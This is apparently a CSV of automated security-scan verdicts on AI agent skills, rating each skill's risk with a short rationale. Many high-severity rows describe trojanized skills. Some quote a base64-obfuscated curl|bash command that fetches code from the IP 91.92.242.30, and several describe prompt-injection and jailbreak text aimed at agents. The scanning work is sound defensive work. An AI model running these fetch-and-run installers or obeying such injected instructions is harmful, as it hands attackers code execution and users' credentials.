slug,source,substrate,severity,prompt_injection,malicious_code,secret_exposure,untrusted_fetch,heuristic_hit_count,heuristic_flags,rationale,classifier_error,content_len,elapsed_s,stars,installs,official_badge,defender_positive
openclaw-skills-github-stars-playbook,skillhub,skills,L0,False,False,False,False,0,,"Educational GitHub growth strategy guide. No code execution, credentials, injection attempts, or malware patterns. References public GitHub repos as informational resources.",,3504,46.83,3708,0,False,False
openclaw-skills-amargotta-theagora,skillhub,skills,L2,False,False,False,True,1,secret_exposure,"External API calls to theagoralabs.ai for financial transactions; grants constrained financial authority (spending caps, daily limits) and auto-execute at external URLs. Transparent & documented, but ",,6550,21.08,0,0,False,False
useai-pro-openclaw-skills-security-output-sanitizer,skillhub,skills,L0,False,False,False,False,0,,"Defensive credential/PII redaction tool. Restricted permissions (fileRead only, no shell/network/write). Purpose is to prevent secret leakage, not enable it. High trust score (94), recent audit (2026-",,12463,37.38,43,1,False,False
gumnut-ai-photos-sdk-python,skillhub,skills,L0,False,False,False,False,0,,"Standard REST API SDK auto-generated by Stainless; proper env-var credential handling; no obfuscation, arbitrary exec, or jailbreak attempts; transparent generation process.",,19288,53.68,0,0,False,False
openclaw-skills-sky-lv-openclaw-agent-discovery,skillhub,skills,L0,False,False,False,False,0,,"Benign agent discovery and evaluation tool. Examples show straightforward queries about finding agents, comparing capabilities, integration, and cost analysis. No code execution, credential handling, ",,505,20.58,0,0,False,False
openclaw-skills-gen-image,skillhub,skills,L0,False,False,False,False,0,,"Legitimate API integration skill. Transparent credential requirement (SILICONFLOW_API_KEY), scoped to known SiliconFlow endpoint, standard curl usage for API calls, no injection or exfiltration patter",,2095,38.99,3633,3,False,False
openclaw-skills-yonghaozhao722-clash-node-manager,skillhub,skills,L2,True,False,True,False,0,,User-controlled node/group names interpolated into subprocess calls without visible escaping; access to proxy configs that may contain credentials/auth tokens; executes unvetted check_clash.py.,,1868,53.93,0,0,False,False
inferen-sh/skills/youtube-thumbnail-design,claudemarketplaces,skills,L0,False,False,False,False,0,,"YouTube thumbnail design tool with standard npm/GitHub install. 173 stars, 6400 installs. No injection, malware, credential, or fetch risks detected. Empty description is UX issue, not security risk.",,427,12.89,173,6400,False,False
openclaw-skills-front-integration,skillhub,skills,L0,False,False,False,False,0,,"Legitimate Membrane integration skill. Explicit credential best practices (no local secrets, browser auth). No malicious patterns, obfuscated code, or prompt injection. Scoped API actions through auth",,6284,27.51,3652,0,False,False
openclaw-skills-ciklopentan-qwen-orchestrator,skillhub,skills,L2,False,False,False,True,0,,"Fetches unvalidated responses from external Qwen Chat service without content validation; browser daemon automation + local session storage (chatUrl, tokens). Medium-risk untrusted LLM response pipeli",,12020,53.67,0,0,False,False
krosebrook-source-of-truth-monorepo-billing-automation,skillhub,skills,L0,False,False,False,False,0,,"Educational billing system documentation. No injection attempts, malicious code, credential exposure, or untrusted fetches. Standard payment processor integration.",,18324,13.12,2,1,False,False
th0rgal-openagent-claude,skillhub,skills,L2,False,False,False,True,2,"malicious_code,untrusted_fetch",Untrusted Library loading (git-backed config with skills/tools/MCPs) + --dangerously-skip-permissions flag disables security prompts. Per-mission CLI execution with loaded untrusted content. No explic,,20000,36.72,354,1,False,False
toolsai/free-zimage-skills/zimage-generation,claudemarketplaces,skills,L1,False,False,False,False,0,,"Image generation skill with empty description; low community engagement (11 stars vs 594 installs). Quality concern but no explicit code visibility or security indicators (injection, obfuscation, cred",,472,52.13,11,594,False,False
openclaw-skills-ryandeangraves-telegram-media,skillhub,skills,L3,True,True,True,False,0,,"'CRITICAL RULE' jailbreak attempt ('never pretend', override safeguards). Logs API tokens & responses. sys.path.insert(0,'.') enables arbitrary module injection. Executes unverified scripts. Hardcoded",,6684,25.23,0,0,False,False
openclaw-skills-riji,skillhub,skills,L1,False,False,False,False,0,,"Personal diary automation with local file ops only. No external fetch, exec, or credentials. Reads from user-controlled local files (SOUL/MEMORY) to generate text & render PNG. Minor quality concern: ",,1515,43.16,3689,0,False,False
nousresearch-hermes-agent-pokemon-player,skillhub,skills,L1,False,False,False,True,1,malicious_code,"Executes third-party GitHub repo (NousResearch/pokemon-agent) + uses localhost.run SSH tunnel. Transparent, no obfuscation, no credentials. Third-party code risk but from known source.",,19554,106.23,21782,4,False,False
euda1mon1a-autonomous-assignment-program-manager-frontend-development,skillhub,skills,L0,False,False,False,False,0,,"Educational frontend skill with standard React/Next.js patterns. Security-aware escalation triggers. No code execution, secrets, or external calls. Benign.",,18544,12.21,2,6,False,False
brianrwagner-ai-marketing-claude-code-skills-linkedin-profile-optimizer,skillhub,skills,L0,False,False,False,False,0,,"Text analysis and rewriting skill. No code execution, external fetches, credential handling, or host LLM exploitation. Processes user's own LinkedIn profile constructively.",,20000,26.8,188,20,False,False
openclaw-skills-peand-rover-generateur-video-ia,skillhub,skills,L2,False,False,False,True,0,,"External API dependency (mega-api-prod.nemovideo.ai) with mandatory file uploads and token-based auth. Session state stored remotely. No local code execution or credential exfiltration, but untrusted ",,7360,58.56,0,0,False,False
vamseeachanta-workspace-hub-optimization-monitor,skillhub,skills,L0,False,False,False,False,0,,"Legitimate system monitoring skill. Collects CPU/memory/network metrics, detects bottlenecks, monitors SLAs. No injection vectors, no external untrusted fetches, no credential handling. Standard MCP i",,7724,17.01,4,2,False,False
sfc-gh-dflippo-snowflake-dbt-demo-dbt-architecture,skillhub,skills,L0,False,False,False,False,0,,"Pure educational content on dbt architecture patterns. No code execution, external fetches, secrets, or LLM manipulation. Static templates and naming conventions only.",,20000,26.43,31,9,False,False
openclaw-skills-ryan-zry-trip-booking-hub,skillhub,skills,L1,False,False,True,True,0,,Third-party booking service integration requiring API credentials. Legitimate Booking.com API but introduces external data dependency and credential mgmt responsibility.,,3831,46.87,0,0,False,False
robinade-persona-theater-global-error-handling,skillhub,skills,L0,False,False,False,False,0,,"Informational skill providing error-handling coding standards guidance via local file reference. No execution, code, injection, or fetch risks.",,517,9.82,3,1,False,False
openclaw-skills-sql-sparql-graphql-skill,skillhub,skills,L1,False,False,False,True,0,,Documented external service (linkeddata.uriburner.com) queries; potential query injection if input validation insufficient.,,6956,41.94,3728,0,False,False
agentgptsmith-monadframework-string-weaver,skillhub,skills,L0,False,False,False,False,0,,"Reasoning/analytical tool using metaphorical string theory framework. Local python invocation, no network, no credentials, no code injection patterns detected.",,17719,54.63,0,1,False,False
openclaw-skills-membranedev-pymetrics,skillhub,skills,L1,False,False,False,False,0,,"Standard third-party integration for Pymetrics API access. Credentials delegated to Membrane server-side auth. Raw API calls scoped to authenticated connection. No injection, obfuscation, or credentia",,4551,15.53,0,0,False,False
policyengine-policyengine-claude-policyengine-testing-patterns-skill,skillhub,skills,L0,False,False,False,False,0,,"Pure testing documentation. No code execution, network calls, credentials, or injection vectors. Educational reference for YAML test patterns.",,10889,26.72,26,2,False,False
dyad-sh-dyad-multi-pr-review,skillhub,skills,L2,True,False,False,True,0,,PR diffs from untrusted authors embedded directly into agent prompts without sanitization. Malicious diffs could inject instructions to compromise review agents' behavior and findings.,,12350,56.13,20031,1,False,False
openclaw-skills-saas-scaffolder,skillhub,skills,L0,False,False,False,False,0,,"Standard SaaS boilerplate scaffolder. Generates Next.js/TypeScript code with proper auth middleware, session validation, and .env.example templates (secrets handled via placeholders, not exposed). No ",,11175,19.36,3685,0,False,False
openclaw-skills-t22239007-max-skill-chinese-localization,skillhub,skills,L2,False,False,False,True,0,,"Fetches skill definitions from external ClawHub service with automatic weekly updates. User confirms before install, but unverified source + auto-update mechanism creates supply chain risk vector.",,303,39.72,0,0,False,False
openclaw-skills-masterbenc-crs-report-generator,skillhub,skills,L2,False,False,True,True,0,,"Processes user-uploaded PDFs (untrusted content) without mentioned input validation; extracts & handles sensitive financial PII (account#, names, balances); BeautifulSoup web parsing adds fetch risk.",,1181,60.53,0,0,False,False
openclaw-skills-upkuajing-company-people-search,skillhub,skills,L2,False,False,False,True,0,,"Untrusted external API fetch (UpKuaJing) + credential requirement (UPKUAJING_API_KEY) + privacy-sensitive data (people/company details, contact info). Credential management is standard but external AP",,10073,16.69,3708,0,False,False
openclaw-skills-solo-setup,skillhub,skills,L1,False,False,False,True,0,,Documentation generator with optional non-essential MCP data fetch; gracefully degrades to local files if unavailable.,,5353,39.15,3652,0,False,False
openclaw-skills-nadavnaveh-arena-compete,skillhub,skills,L2,False,False,True,True,0,,"Unvalidated template vars in shell commands ($0,$1,$2) enable command injection; API keys passed as CLI args visible in process listings; reads untrusted README/code from Arena workspace.",,2664,59.01,0,0,False,False
mvillmow-projectodyssey-quality-coverage-report,skillhub,skills,L0,False,False,False,False,0,,"Benign educational content about pytest coverage tooling. Standard test commands, no credential handling, untrusted fetches, or exploit vectors.",,2877,9.55,17,4,False,False
dragonnzhang-savings-simulator-devops,skillhub,skills,L0,False,False,False,False,3,"malicious_code,untrusted_fetch","Pure DevOps documentation/guide. References legitimate official SDKs (Google Cloud, Docker, Cloudflare). Includes security best practices. No code execution, obfuscation, or attack vectors. Educationa",,20000,22.99,1,2,False,False
openclaw-skills-abdhilabs-karmabank-usdc,skillhub,skills,L2,False,False,False,True,0,,"Untrusted fetch: external APIs (Moltbook, Circle) determine credit tiers; grants financial authority up to 1000 USDC; testnet reduces exposure",,2095,53.77,0,0,False,False
openclaw-skills-mattc95-humanizer-es,skillhub,skills,L0,False,False,False,False,0,,"Benign text editing skill. Analyzes and rewrites text to remove AI patterns. Limited to file ops (Read/Write/Edit) and user interaction. No code execution, external calls, or credential handling.",,20000,11.8,0,0,False,False
inoue2002-agent-skills-xmind,skillhub,skills,L1,False,False,False,False,0,,"Utility tool using official xmind SDK for file format conversion. No injection, malware, or credential exfiltration. Code quality issues (bare excepts, missing input validation) prevent L0 rating.",,20000,26.44,0,0,False,False
affaan-m-everything-claude-code-strategic-compact,skillhub,skills,L0,False,False,False,False,0,,"Benign context management utility. No network access, code execution, or sensitive data handling. Transparent workflow documentation. MIT-licensed.",,20000,39.76,128273,15,False,False
openclaw-skills-yhyyz-aws-emr-skills,skillhub,skills,L1,False,False,False,False,0,,"Third-party AWS EMR management skill. No injection/malware/exfiltration. Credentials via boto3 default chain; secret masking documented. Risk is operational privilege delegation (job submission, clust",,6635,21.8,0,0,False,False
openclaw-skills-yixinli867-skill-creator-2,skillhub,skills,L0,False,False,False,False,0,,"Educational guide for skill creation. No external fetches, credentials, suspicious instructions, or risk signals. Pure procedural documentation.",,17929,31.4,0,0,False,False
pyspa-doge-shell,skillhub,skills,L1,False,False,False,False,0,,Legitimate shell project with security-aware design. OpenAI/MCP integration is intentional with Safety Guard approval gates. Secret management explicitly configured to exclude API keys from repos.,,20000,51.09,3,0,False,False
matt-fell-ai-pai-vibe,skillhub,skills,L3,False,True,False,True,0,,"Arbitrary code execution: quick-start instructs cloning external GitHub repo and executing ./bin/pai-init, ./bin/pai-omni, ./bin/pai-test without verification. Vague skill intent masked by grandiose '",,3518,16.85,0,0,False,False
openclaw-skills-minimax-tts-v2,skillhub,skills,L2,False,False,True,False,0,,API key exposed in process list (ps aux); credentials required for external search API; proper input escaping with jq; documented but unmitigated process-list visibility risk.,,3083,43.51,3652,3,False,False
aaron-he-zhu/seo-geo-claude-skills/performance-reporter,claudemarketplaces,skills,L1,False,False,False,True,0,,"Third-party GitHub skill; npx execution introduces standard dependency risk. Empty description reduces transparency. No explicit malicious signals, but standard third-party trust boundary.",,480,58.07,1000,2300,False,False
openclaw-skills-living-hi-one-person-company-os,skillhub,skills,L0,False,False,False,False,0,,"Business productivity skill for one-person company operations. Scoped Python execution with user approval, workspace-isolated file persistence, explicit credential/authority boundaries stated. No mali",,5799,18.02,0,0,False,False
openclaw-skills-gora050-helpwise,skillhub,skills,L0,False,False,False,False,0,,"Legitimate Helpwise integration. Secure OAuth-based auth via Membrane CLI, credentials managed server-side, no code injection or exploitation patterns, clear documented scope.",,5726,31.24,0,0,False,False
jg-chalk-io-nora-livekit-moai-baas-auth0-ext,skillhub,skills,L2,False,False,False,True,0,,"Unscoped Bash + WebFetch combo enables fetch-and-execute pattern risk. Auth0 use case legitimate, but tool scope exceeds documented needs.",,20000,49.29,0,1,False,False
aimcloudx-aimassist,skillhub,skills,L0,False,False,False,False,0,,"Standard .NET WPF project documentation. Describes architecture, DI patterns, plugin system, APIs. No security directives, credential embedding, or Claude Code manipulation attempts.",,6978,20.78,0,0,False,False
openclaw-skills-ivangdavila-cat,skillhub,skills,L0,False,False,False,False,0,,"Local-only pet care tracker. No external network requests, no code execution risks, no credential handling. Explicit disclaimer against medical diagnosis. User approves local storage in ~/cat/. Well-s",,7301,38.48,0,0,False,False
openclaw-skills-syedateebulislam-whatsapp-voice-chat-integration-open-source,skillhub,skills,L1,False,False,False,False,0,,"Legitimate voice processing tool. Uses Whisper API (trusted), keyword-based intent detection (not LLM prompts), standard dependencies (whisper, soundfile, numpy). File daemon watches defined directory",,6655,61.01,0,0,False,False
openclaw-skills-mmichelli-db-travel,skillhub,skills,L1,False,False,False,True,0,,"Public transit API with no auth; external fetch of non-sensitive data (schedules, times). Input validation not documented but typical for REST endpoints.",,3092,22.44,0,0,False,False
openclaw-skills-guanxing,skillhub,skills,L2,False,False,True,True,0,,"Sends user PII (birth dates, names) and API credentials to untrusted external service (heartai.zeabur.app). No documented data storage guarantees; trust depends entirely on third-party provider securi",,9437,41.07,3688,0,False,False
openclaw-skills-pydantic-ai-dependency-injection,skillhub,skills,L0,False,False,False,False,0,,Educational documentation for PydanticAI dependency injection. Standard technical reference with safe code examples. Best practices section explicitly recommends passing initialized clients over raw c,,5011,54.72,3689,0,False,False
openclaw-skills-tl-image,skillhub,skills,L1,False,False,False,True,0,,"External image API calls are core function (TensorsLab), not hidden. Transparent credential handling, no code injection or host LLM attacks. Content download is intended behavior.",,6374,28.79,3685,0,False,False
ajbcoding-claude-skill-eval-moai-security-owasp,skillhub,skills,L0,False,False,False,False,1,prompt_injection,"Legitimate OWASP security education; demonstrates secure coding patterns, not exploits; appropriate tool access (Read, WebSearch); no injection vectors or credential misuse.",,10465,40.76,4,2,False,False
dnyoussef-context-cascade-prompt-architect,skillhub,skills,L2,True,False,False,False,0,,Custom notation [ground|conf|state] with inflated confidence scores (0.95-1.0) and cognitive frame injection designed to override reasoning; self-bootstrap & dogfooding pattern suggests LLM cognitive ,,20000,59.01,27,1,False,False
github/awesome-copilot/copilot-usage-metrics,claudemarketplaces,skills,L1,False,False,False,False,0,,"Legitimate GitHub project (29.9k stars) providing usage metrics; minor transparency issue (empty description) and unspecified telemetry scope, but no explicit risk signals or code indicators.",,437,12.58,29900,8300,False,False
openclaw-skills-imt-vt-b,skillhub,skills,L1,False,False,False,False,0,,Third-party video API integration with standard Bearer token auth; credentials auto-expire and are revocable; only non-sensitive UUID persisted locally; no malicious code patterns.,,13673,42.56,3725,0,False,False
inferencesh-skills-ai-automation-workflows,skillhub,skills,L2,False,False,False,True,1,malicious_code,Downloads and executes external binaries from inference.sh (with SHA-256 verification); uses API credentials in automated workflows; moderate risk if external service compromised or credentials miscon,,16622,99.83,271,4,False,False
openclaw-skills-ckchzh-freeport,skillhub,skills,L0,False,False,False,False,0,,"Benign reference skill for logistics/trade zones. Static commands, no user input interpolation, no credential handling, no external data fetching, no code execution risks.",,2517,13.61,0,0,False,False
openclaw-skills-claude-code,skillhub,skills,L1,False,False,False,False,0,,Documentation wrapper with scoped OpenClaw integration. Fetches from legitimate source (code.claude.com). No malware patterns. Minor ambiguity about task execution scope in implementation.,,6757,38.23,3652,1,False,False
openhands-skills-npm,skillhub,skills,L1,False,False,False,False,0,,"Automates npm confirmation via `yes` piping for non-interactive envs. Legitimate use case but bypasses npm safety prompts, risking unreviewed package acceptance in supply-chain contexts.",,2958,58.68,81,1,False,False
openclaw-skills-goog-nba,skillhub,skills,L0,False,False,False,False,0,,Fetches public sports data from official NBA CDN and StatMuse; stdlib only; no credentials or user input in URLs; no code execution risks.,,2745,14.19,0,0,False,False
openclaw-skills-vahagn-madatyan-example-device-health,skillhub,skills,L0,False,False,False,False,0,,"Read-only Cisco diagnostic skill; all commands are informational/statistical (show version, processes, memory). No code execution, credential extraction, or LLM manipulation.",,8886,29.29,0,0,False,False
openclaw-skills-wuli,skillhub,skills,L0,False,False,False,False,0,,"Straightforward API wrapper for Wuli.art image/video generation. Proper credential handling via env vars, authenticated requests to stated service, no code execution or injection.",,16407,41.85,3722,0,False,False
anthropics/brand-guidelines,skills.sh,skills,L0,False,False,False,False,0,,"Official Anthropic branding skill. HTML page describes utility for applying design colors/typography. No executables, credentials, or suspicious payloads. Standard web UI.",,20000,10.29,0,0,False,False
openclaw-skills-rotemtam-clawback-gmail,skillhub,skills,L3,False,False,True,True,1,malicious_code,curl|bash install from external domain (clawback.sh) with Gmail credential delegation to proxy. Matches L3 criteria: malware distribution pattern + arbitrary code execution on install + secret exposur,,4704,35.68,0,0,False,False
openclaw-skills-mike47512-currency-conversion,skillhub,skills,L0,False,False,False,False,0,,"Benign documentation for currency conversion tool. Third-party API dependency is normal; privacy warnings present. No injection, code, credential, or fetch risks detected.",,391,48.12,0,0,False,False
openclaw-skills-vahagn-madatyan-azure-networking-audit,skillhub,skills,L0,False,False,False,False,0,,"Read-only Azure audit skill using transparent CLI commands. No code execution, dynamic prompts, secret handling, or egress beyond Microsoft management API. RBAC-scoped.",,18227,14.53,0,0,False,False
openclaw-skills-thesethrose-notebook,skillhub,skills,L0,False,False,False,False,0,,"Local-first YAML knowledge base for personal use. No code execution, network fetches, or credential handling. User-defined types, standard file ops, privacy-conscious design.",,3858,30.01,0,0,False,False
openclaw-skills-gate-exchange-gate-exchange-affiliate,skillhub,skills,L0,False,False,False,False,0,,"Legitimate affiliate API integration. Requires authentication header, enforces API rate limits (30-day windows), guards against misuse via explicit parameter validation. No code execution, fetch from ",,20000,52.6,0,0,False,False
epieczko-betty-docs-validate-skilldocs,skillhub,skills,L0,False,False,False,False,0,,"Documentation validation tool. Local file-only scope (reads SKILL.md & skill.yaml), performs static analysis, outputs JSON validation reports. No network, credential, or code execution risks.",,10111,12.24,0,1,False,False
openclaw-skills-hanxueyuan-ana,skillhub,skills,L0,False,False,False,False,0,,"Benign informational skill providing reference data (history, products, market data, news) about a brand/organization/city. No code execution, credential handling, or security-relevant functionality d",,412,28.87,0,0,False,False
openclaw-skills-tobewin-timezone-helper,skillhub,skills,L0,False,False,False,False,0,,"Pure offline utility with static IANA timezone data. No network calls, code execution, or external dependencies. Processes user input (city names, times) via simple mathematical conversion logic only.",,6713,38.51,0,0,False,False
rysweet-azlin-journalist-analyst,skillhub,skills,L0,False,False,False,False,0,,"Educational skill on journalism frameworks (5Ws, source evaluation, newsworthiness). Static content, no code execution, credential handling, or prompt injection attempts. Wikipedia citations are refer",,20000,13.61,2,23,False,False
openclaw-skills-cp3d1455926-svg-obsidian-ontology-sync-cp3d,skillhub,skills,L1,False,False,False,False,0,,"Legitimate PKM tool; reads local Obsidian vault, extracts entities to JSON ontology. No external fetches, LLM prompting, or credential exfiltration. Unscoped cron scheduling (analyze, feedback phases)",,15281,38.05,0,0,False,False
openclaw-skills-samcheng0717-video-pusher,skillhub,skills,L2,False,False,True,True,0,,Manages multi-platform account credentials with persistent sessions stored locally; downloads ~150MB Chromium binary via playwright without verification. Legitimate publishing automation but credentia,,3944,52.95,0,1,False,False
openclaw-skills-ntriq-gh-ntriq-audio-intelligence-mcp,skillhub,skills,L2,False,False,False,True,1,untrusted_fetch,"audio_url parameter fetches arbitrary URLs without documented validation or SSRF protections. Legitimate audio processing tool, but untrusted_fetch risk requires URL allow-listing or validation.",,1935,22.26,0,0,False,False
github/awesome-copilot/repo-story-time,claudemarketplaces,skills,L0,False,False,False,False,0,,"Official GitHub-authored skill with 29.9k stars and 8.3k installs. Standard npm installation. Reads repository files (scoped, user-controlled). No malware, jailbreak, or credential exfil signals.",,413,42.46,29900,8300,False,False
openclaw-skills-chris-openclaw-client-project-tracker,skillhub,skills,L0,False,False,False,False,0,,"Local CRM for freelancers with sound data persistence practices. Stores PII/financials locally as intended. No exfiltration, code execution, or prompt injection vectors detected.",,9388,57.46,0,0,False,False
mandubian-ccos-agent-workflows,skillhub,skills,L0,False,False,False,False,0,,"Educational documentation on agent workflow patterns. No code execution, no credential handling, no suspicious fetches. Emphasizes governance & approval checks.",,20000,12.32,11,0,False,False
openclaw-skills-zachmael-clawhq-dashboard,skillhub,skills,L1,False,False,False,True,0,,"Transparent external service integration. API key intentionally transmitted via standard HTTPS Bearer auth. User explicitly configures this to report agent status. No exploitation vectors, no code exe",,1897,37.06,0,0,False,False
openclaw-skills-xiaoyinqu-ai-search,skillhub,skills,L1,False,False,False,True,1,untrusted_fetch,"Third-party web search service. Requires SKILLBOSS_API_KEY credential; fetches untrusted web content by design (intended purpose). Standard API auth, disclosed pricing/free tier, MIT license. No injec",,1717,50.29,0,0,False,False
camoa-claude-skills-infographic-generator,skillhub,skills,L0,False,False,False,False,0,,"Benign data visualization skill. Local rendering via @antv/infographic template engine. JSON config input, no code execution, no network calls, no credentials. Pure UI generation.",,20000,13.53,20,2,False,False
openclaw-skills-jarviyin-objective-evaluator,skillhub,skills,L0,False,False,False,False,0,,"Benign design evaluation framework. References legitimate design books (Fadell, Norman, Rams). No code execution, network calls, credential handling, or LLM manipulation attempts.",,4934,23.96,0,0,False,False
openclaw-skills-sakaen736jih-wacli-5qi,skillhub,skills,L3,False,True,False,True,0,,macOS installer uses curl|bash with base64-obfuscated payload downloading from suspicious IP (91.92.242.30). Classic malware distribution pattern. Arbitrary code execution on install.,,2887,37.7,0,0,False,True
openclaw-skills-openclaw-backup-dnkxm,skillhub,skills,L2,False,False,False,True,0,,Requires downloading openclawcli from unverified GitHub/glot.io (paste-bin). Backs up credential-containing config files. Supply chain risk.,,16737,18.52,3652,0,False,True
openclaw-skills-x-trends-cpif3,skillhub,skills,L2,False,False,True,True,0,,Requires downloading & executing custom third-party binary (openclaw-agent) and external script (glot.io). Stores X API credentials locally via twurl. Repo disclaimer warns of suspicious skills.,,3902,33.39,3695,0,False,True
openclaw-skills-x-trends-p7ivk,skillhub,skills,L3,False,True,True,True,0,,Requires downloading untrusted binary (openclaw-agent.exe) or executing script from glot.io code-sharing site without verification. Requests Twitter API credentials (consumer-key/secret) vulnerable to,,3902,47.36,3652,1,False,True
openclaw-skills-yahoo-finance-jdlqs,skillhub,skills,L2,False,False,False,True,0,,Skill requires unverified third-party 'openclaw-agent' tool from undocumented GitHub repo (hedefbari/openclaw-agent) with password-protected archives and glot.io snippet installation. Python code itse,,5795,16.82,3652,0,False,True
openclaw-skills-solana-7rrh8,skillhub,skills,L3,False,True,True,True,0,,"Curl|bash in metadata, external agent binary (hedefbari/openclaw-agent), macOS setup references glot.io code snippet site. Wallet interaction tool + background agent = credential theft surface. Classi",,4360,32.06,3695,0,False,True
openclaw-skills-x-trends-axy84,skillhub,skills,L3,False,True,False,True,0,,openclaw-agent binary download + glot.io script-paste instruction are classic malware vectors. Unnecessary for Twitter API; appears trojanized.,,3902,46.78,3652,0,False,True
openclaw-skills-sakaen736jih-summarize-nrqj,skillhub,skills,L3,False,True,True,True,0,,"MacOS installer contains obfuscated curl|bash (base64: '/bin/bash -c ""$(curl -fsSL http://91.92.242.30/...)""'), classic malware distribution. Requires multiple API keys (OpenAI, Anthropic, Google) as ",,2161,13.29,0,0,False,True
openclaw-skills-sakaen736jih-wacli-mwj,skillhub,skills,L3,False,True,False,True,0,,MacOS setup contains base64-obfuscated curl|bash command fetching from suspicious IP 91.92.242.30. Classic malware distribution vector. OpenClawProvider sideload pattern is deceptive.,,2880,26.86,0,0,False,True
openclaw-skills-sakaen736jih-bird-js,skillhub,skills,L3,False,True,False,True,0,,MacOS setup contains base64-obfuscated curl|bash downloading from unverified IP (91.92.242.30). Decodes to arbitrary code execution. Classic malware distribution vector.,,1251,42.55,0,0,False,True
openclaw-skills-hightower6eu-youtube-summarize-zserr,skillhub,skills,L2,False,False,False,True,0,,Requires downloading third-party binary (openclaw-agent.zip) and running arbitrary scripts from glot.io. yt-dlp works standalone—the openclaw dependency is suspicious. Potential command injection from,,4995,21.47,0,0,False,True
openclaw-skills-youtube-video-downloader-hvzyq,skillhub,skills,L3,False,True,False,True,0,,"glot.io snippet requires copy-pasting hidden script into Terminal; no code visibility, claimed system necessity, external hosted installer. Classic malware distribution vector.",,5426,42.59,3637,1,False,True
openclaw-skills-wallet-tracker-s5hx9,skillhub,skills,L3,False,True,False,False,1,secret_exposure,Requires external binary (openclaw-agent); password-protected GitHub distribution; directs copy-paste installation from glot.io snippet service. Supply-chain attack vector.,,7782,67.09,3652,0,False,True
openclaw-skills-sakaen736jih-summarize-syis,skillhub,skills,L3,False,True,True,True,0,,MacOS install script contains base64-obfuscated curl|bash pattern downloading code from bare IP 91.92.242.30. Classic malware distribution. Arbitrary execution on install + access to API keys = critic,,2154,13.74,0,0,False,True
openclaw-skills-sakaen736jih-youtube-watcher-u,skillhub,skills,L3,False,True,True,True,0,,MacOS install contains base64-obfuscated curl|bash RCE: decodes to remote code fetch from 91.92.242.30. Malware distribution disguised as yt-dlp wrapper.,,2279,25.2,0,0,False,True
openclaw-skills-agent-browser-zd1dook9mtfz,skillhub,skills,L3,False,True,True,True,0,,MacOS setup uses base64-obfuscated curl|bash downloading from untrusted IP (91.92.242.30). Classic malware delivery. Browser tool with untrusted remote dep = credential exfiltration risk.,,11394,39.76,3652,1,False,True
openclaw-skills-hightower6eu-youtube-thumbnail-grabber-ktwoe,skillhub,skills,L3,False,True,False,True,0,,Trojanized skill: legitimate thumbnail download functionality bundled with mandatory requirement to download & execute unverified external binary (openclaw-agent) from non-standard sources (hedefbari/,,5236,19.37,0,0,False,True
openclaw-skills-sakaen736jih-coding-agent-4ilvlj7rs,skillhub,skills,L3,False,True,False,True,0,,MacOS installer uses base64-obfuscated curl|bash pattern downloading from untrusted IP (91.92.242.30) via HTTP. Classic malware distribution technique.,,9189,31.99,0,0,False,True
openclaw-skills-sakaen736jih-summarize-kx5u,skillhub,skills,L3,False,True,False,True,0,,Base64-encoded curl|bash downloads code from external IP (91.92.242.30) — malware signature. Obfuscated supply-chain attack vector.,,2154,46.63,0,0,False,True
openclaw-skills-solana-uxcvc,skillhub,skills,L3,False,True,True,True,0,,Requires execution of unverified third-party executable (openclaw-agent) + curl|bash installer. Password-protected archive with no checksums matches malware distribution pattern.,,4360,15.33,3652,0,False,True
openclaw-skills-sakaen736jih-agent-browser-ymepfebfpc2x,skillhub,skills,L3,False,True,True,True,0,,"MacOS installer contains obfuscated curl|bash executing code from 91.92.242.30 (suspicious IP, not legitimate CDN). Classic malware delivery pattern. Credential/cookie handling without scoping. Window",,11004,37.99,0,0,False,True
openclaw-skills-zaycv-clawbhub,skillhub,skills,L3,False,True,False,True,0,,macOS prerequisite uses base64-obfuscated curl|bash piping to 91.92.242.30/q0c7ew2ro8l2cfqp—textbook malware delivery pattern. Windows variant requires password-protected zip from GitHub.,,12475,57.1,0,0,False,True
openclaw-skills-zaycv-clawhud,skillhub,skills,L3,True,True,False,True,0,,macOS prerequisites contain obfuscated base64 payload decoding to `curl | bash http://91.92.242.30/q0c7ew2ro8l2cfqp` — classic malware distribution. Arbitrary code execution + credential handling via ,,12463,15.74,0,0,False,True
openclaw-skills-insider-wallets-finder-im29o,skillhub,skills,L2,False,False,False,True,1,secret_exposure,Requires external executable (openclaw-agent) download from GitHub; supply chain attack vector via unverified binary dependency.,,8753,34.32,3652,0,False,True
openclaw-skills-auto-updater-ocn18,skillhub,skills,L3,False,True,False,True,0,,"Requires downloading/executing external 'openclaw-agent' executable (password-protected, no hash verification). macOS users directed to glot.io (public paste site) to copy installation script. Automat",,5354,47.59,3652,0,False,True
